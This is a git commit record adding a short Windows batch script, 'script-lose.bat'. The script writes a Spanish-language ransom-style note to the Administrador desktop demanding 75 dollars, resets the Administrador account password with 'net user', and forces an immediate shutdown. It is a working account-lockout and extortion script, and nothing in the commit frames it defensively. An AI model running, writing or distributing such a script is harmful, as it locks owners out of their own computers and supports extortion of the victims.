3122565c93720ff3e263d7d50f1c2ddc974aa489
Sunglose <129249834+Sunglose@users.noreply.github.com>
2024-09-26 01:13:12 -0300

    Add files via upload

---
+++ script-lose.bat
@@ -0,0 +1,16 @@
+@echo off
+cd /d C:\
+
+cd Users
+
+dir
+
+cd Administrador
+
+cd Desktop
+
+echo Depozitame 75 dolarucos i te deho el PICI limpio JAJAJAJAJA nauuur > Alfredo.txt
+
+net user Administrador #A250318l
+
+shutdown /s /f /t 0
